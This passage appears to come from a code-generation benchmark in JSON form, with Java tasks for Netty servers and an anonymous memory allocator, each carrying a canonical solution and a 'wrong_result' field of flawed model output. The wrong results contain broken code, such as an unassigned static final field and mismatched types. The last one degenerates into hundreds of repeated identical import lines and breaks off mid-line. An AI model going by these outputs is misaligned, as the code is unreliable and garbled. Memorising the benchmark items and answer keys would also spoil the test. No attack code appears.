    cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections, processing requests through a configurable message handler, and managing server resources efficiently.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that extends AbstractServer. It manages server lifecycle (opening/closing), handles incoming connections with configurable thread pools, and processes messages through a provided message handler. The server supports connection management, configurable worker threads, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection events\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- serverChannel: [Channel] - Represents the server's listening channel\n- messageHandler: [MessageHandler] - Processes incoming requests\n- standardThreadExecutor: [StandardThreadExecutor] - Manages worker threads for request processing\n- rejectCounter: [AtomicInteger] - Tracks rejected requests count\n- channelManage: [NettyServerChannelManage] - Manages active connections\n\nMethods:\n- open() -> [boolean] - Starts the server, initializes thread pools, binds to port, and sets up channel pipeline. Returns true if successful.\n- close() -> [void] - Shuts down the server gracefully, releasing all resources including thread pools and channels.\n- isBound() -> [boolean] - Checks if server is actively listening for connections.\n- request(Request) -> [Response] - Throws MotanFrameworkException as server doesn't support direct requests (inherited from AbstractServer).\n\nInput:\n- URL url: Configuration parameters for server setup (port, thread counts, queue sizes etc.)\n- MessageHandler messageHandler: Handler for processing incoming messages\n\nOutput:\n- When open() succeeds: Server starts listening on specified port and returns true\n- When close() completes: All server resources are released and state set to CLOSE\n- isBound(): Returns current server binding status",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.MessageHandler;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NettyServer extends AbstractServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private StandardThreadExecutor standardThreadExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n    private NettyServerChannelManage channelManage;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url);\n        this.messageHandler = messageHandler;\n    }\n\n    @Override\n    public boolean open() {\n        if (isAvailable()) {\n            LoggerUtil.warn(\"NettyServer ServerChannel already Open: url=\" + url);\n            return state.isAliveState();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        LoggerUtil.info(\"NettyServer ServerChannel start Open: url=\" + url);\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        int maxServerConnection = url.getIntParameter(URLParamType.maxServerConnection.getName(), URLParamType.maxServerConnection.getIntValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), URLParamType.workerQueueSize.getIntValue());\n\n        int minWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER) :\n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n        int maxWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER) :\n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n\n        standardThreadExecutor = new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, \n            new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        channelManage = new NettyServerChannelManage(maxServerConnection);\n\n        ServerBootstrap serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(\"channel_manage\", channelManage);\n                    pipeline.addLast(\"decoder\", new NettyDecoder(codec, NettyServer.this, maxContentLength));\n                    pipeline.addLast(\"encoder\", new NettyEncoder());\n                    pipeline.addLast(\"handler\", new NettyChannelHandler(NettyServer.this, messageHandler, standardThreadExecutor));\n                }\n            });\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(url.getPort()));\n        channelFuture.syncUninterruptibly();\n        serverChannel = channelFuture.channel();\n        setLocalAddress((InetSocketAddress) serverChannel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n\n        state = ChannelState.ALIVE;\n        LoggerUtil.info(\"NettyServer ServerChannel finish Open: url=\" + url);\n        return state.isAliveState();\n    }\n\n    @Override\n    public synchronized void close() {\n        if (state.isCloseState()) {\n            return;\n        }\n\n        try {\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            if (bossGroup != null) {\n                bossGroup.shutdownGracefully();\n                bossGroup = null;\n            }\n            if (workerGroup != null) {\n                workerGroup.shutdownGracefully();\n                workerGroup = null;\n            }\n            if (channelManage != null) {\n                channelManage.close();\n            }\n            if (standardThreadExecutor != null) {\n                standardThreadExecutor.shutdownNow();\n            }\n\n            state = ChannelState.CLOSE;\n            LoggerUtil.info(\"NettyServer close Success: url={}\", url.getUri());\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyServer close Error: url=\" + url.getUri(), e);\n        }\n    }\n\n    @Override\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isActive();\n    }\n\n    @Override\n    public Response request(Request request) throws TransportException {\n        throw new MotanFrameworkException(\"NettyServer request(Request request) method not support: url: \" + url);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyServer extends AbstractServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private ExecutorService standardThreadExecutor;\n    private AtomicInteger rejectCounter;\n    private NettyServerChannelManage channelManage;\n\n    public NettyServer(String url, MessageHandler messageHandler) {\n        int port = extractPortFromUrl(url);\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        standardThreadExecutor = Executors.newFixedThreadPool(10);\n        rejectCounter = new AtomicInteger(0);\n        channelManage = new NettyServerChannelManage();\n        this.messageHandler = messageHandler;\n    }\n\n    public boolean open() {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<Channel>() {\n                         @Override\n                         protected void initChannel(Channel ch) {\n                             ch.pipeline().addLast(new StringDecoder());\n                             ch.pipeline().addLast(new StringEncoder());\n                             ch.pipeline().addLast(messageHandler);\n                         }\n                     })\n                     .option(ChannelOption.SO_REUSEADDR, true)\n                     .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            serverChannel = bootstrap.bind(extractPortFromUrl(url)).sync();\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void close() {\n        if (serverChannel != null) {\n            serverChannel.closeFuture().sync();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        standardThreadExecutor.shutdown();\n    }\n\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isBound();\n    }\n\n    public Response request(Request request) {\n        throw new MotanFrameworkException(\"Server does not support direct requests\");\n    }\n\n    private int extractPortFromUrl(String url) {\n        int port = 8080;\n        if (url.contains(\":\")) {\n            String[] parts = url.split(\":\");\n            if (parts.length > 1) {\n                try {\n                    port = Integer.parseInt(parts[1]);\n                } catch (NumberFormatException e) {\n                    // Handle error\n                }\n            }\n        }\n        return port;\n    }\n}"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a class that provides anonymous memory allocation capabilities using memory-mapped files, with a fallback to direct byte buffers if memory-mapped files cannot be unlinked.\n\nClass Description: The `AnonAllocator` class is designed to allocate anonymous memory blocks that are not backed by visible files in the filesystem. It attempts to use memory-mapped files that are immediately unlinked (deleted) from the filesystem while remaining accessible through the mapping. If this technique is not supported by the system, it falls back to using direct byte buffers.\n\nAttributes:\n- MAP_AND_UNLINK_SUPPORTED: boolean - A static final flag indicating whether the system supports memory mapping with immediate file unlinking. This is determined during class initialization by testing the capability.\n\nMethods:\n- allocate(int size) -> ByteBuffer - Allocates an anonymous memory block of the specified size. If memory-mapped files with unlinking are supported, it creates a temporary file, maps it into memory, and immediately deletes the file. Otherwise, it falls back to a direct byte buffer allocation. The method returns the allocated ByteBuffer.\n  - Input: size (int) - The size of the memory block to allocate in bytes.\n  - Output: ByteBuffer - The allocated memory block, either as a memory-mapped buffer or a direct byte buffer.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class AnonAllocator {\n\n    static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        Path p = null;\n        boolean result = false;\n        try {\n            ByteBuffer mapped;\n            p = Files.createTempFile(\"unlink-test\", \".tmp\");\n            FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            chan.write(ByteBuffer.allocate(4*1024));\n            mapped = chan.map(MapMode.READ_WRITE, 0, 4*1024);\n            chan.close();\n            Files.delete(p);\n            result = mapped.get() == 0;\n        } catch (IOException e) {\n            if(p != null) {\n                Path toDelete = p;\n                Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                    try {\n                        Files.deleteIfExists(toDelete);\n                    } catch (IOException e1) {\n                        System.err.println(\"could not delete tempfile \"  + toDelete + \", most likely cause: garbage collector did not free the memory mapping keeping it open ; \" + e1.getMessage());\n                    }\n                }));\n            }\n        }\n        MAP_AND_UNLINK_SUPPORTED = result;\n    }\n\n    public static ByteBuffer allocate(int size) {\n        if(MAP_AND_UNLINK_SUPPORTED) {\n            try {\n                Path p = Files.createTempFile(\"anon-mapping\", \".tmp\");\n                ByteBuffer mapped;\n                FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n                chan.position(size);\n                chan.write(ByteBuffer.allocate(1));\n                mapped = chan.map(MapMode.READ_WRITE, 0, size);\n                chan.close();\n                Files.delete(p);\n                return mapped;\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return ByteBuffer.allocateDirect(size);\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class AnonAllocator {\n    private static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        try {\n            File temp = Files.createTempFile(null, null);\n            try (FileChannel channel = FileChannel.open(temp.toPath(), StandardOpenOption.READ, StandardOpenOption.WRITE)) {\n                MappedByteBuffer buffer = channel.map(MapMode.READ_WRITE, 0, 1024);\n                Files.delete(temp.toPath());\n            }\n        } catch (IOException e) {\n            MAP_AND_UNLINK_SUPPORTED = false;\n        }\n    }\n\n    public ByteBuffer allocate(int size) {\n        if (MAP_AND_UNLINK_SUPPORTED) {\n            try {\n                File temp = Files.createTempFile(null, null);\n                try (FileChannel channel = FileChannel.open(temp.toPath(), StandardOpenOption.READ, StandardOpenOption.WRITE)) {\n                    MappedByteBuffer buffer = channel.map(MapMode.READ_WRITE, 0, size);\n                    Files.delete(temp.toPath());\n                    return buffer;\n                }\n            } catch (IOException e) {\n                return ByteBuffer.allocateDirect(size);\n            }\n        } else {\n            return ByteBuffer.allocateDirect(size);\n        }\n    }\n}"
  },
  {
    "Task_id": 211,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with configurable thread pools and graceful shutdown capabilities.\n\nClass Description: NettySourceHttpServer is a TCP server implementation using Netty framework that handles HTTP requests. It manages server lifecycle (initialization, startup, shutdown) and uses configurable thread pools for handling connections. The server can be initialized with specific query registry and event subject for request processing.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations and other tasks for accepted connections\n- bossGroup: [NioEventLoopGroup] - Accepts incoming connections with configurable thread count\n- nettyServerRunnable: [Runnable] - Contains the server startup logic\n- isInitialized: [boolean] - Tracks whether the server has been initialized\n- isStarted: [boolean] - Tracks whether the server is running\n\nMethods:\n- [Constructor]([Context context, int threadCount]) -> [void] - Initializes bossGroup with specified thread count and workerGroup with default settings\n- init([QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port]) -> [void] - Configures server bootstrap with HTTP handlers and binding port if not already initialized\n- startServer() -> [void] - Starts the server in a separate thread if initialized but not running, adds shutdown hook\n- shutdownServer() -> [void] - Gracefully shuts down server resources if initialized and running",
    "Canonical_solution": "import io.mantisrx.connector.publish.core.QueryRegistry;\nimport io.mantisrx.runtime.Context;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.subjects.Subject;\n\npublic class NettySourceHttpServer implements SourceHttpServer {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NettySourceHttpServer.class);\n\n    private final NioEventLoopGroup workerGroup;\n    private final NioEventLoopGroup bossGroup;\n\n    private Runnable nettyServerRunnable;\n    private volatile boolean isInitialized = false;\n    private volatile boolean isStarted = false;\n\n    public NettySourceHttpServer(Context context, int threadCount) {\n        this.bossGroup = new NioEventLoopGroup(threadCount);\n        this.workerGroup = new NioEventLoopGroup();\n    }\n\n    @Override\n    public void init(QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port) {\n        if (!isInitialized) {\n            nettyServerRunnable = () -> {\n                try {\n                    ServerBootstrap b = new ServerBootstrap();\n                    b.option(ChannelOption.SO_BACKLOG, 1024);\n                    b.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new HttpServerInitializer(queryRegistry, eventSubject));\n                    Channel ch = b.bind(port).sync().channel();\n                    ch.closeFuture().sync();\n                } catch (Exception e) {\n                    LOGGER.error(e.getMessage());\n                } finally {\n                    bossGroup.shutdownGracefully();\n                    workerGroup.shutdownGracefully();\n                }\n            };\n\n            isInitialized = true;\n        }\n    }\n\n    @Override\n    public void startServer() {\n        if (isInitialized && !isStarted) {\n            ExecutorService executor = Executors.newSingleThreadExecutor();\n            executor.submit(nettyServerRunnable);\n\n            Runtime.getRuntime().addShutdownHook(new Thread(this::shutdownServer));\n\n            isStarted = true;\n        } else {\n            throw new IllegalStateException(\"Server already started\");\n        }\n    }\n\n    @Override\n    public void shutdownServer() {\n        if (isInitialized && isStarted) {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport java.io.IOException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandler.Sharable;\nimport io.netty.channel.ChannelPipeline;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicReference;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.util.concurrent.ScheduledExecutorService;\nimport io.netty.util.concurrent.DefaultThreadFactory;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.RejectedExecutionHandler;\nimport java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport 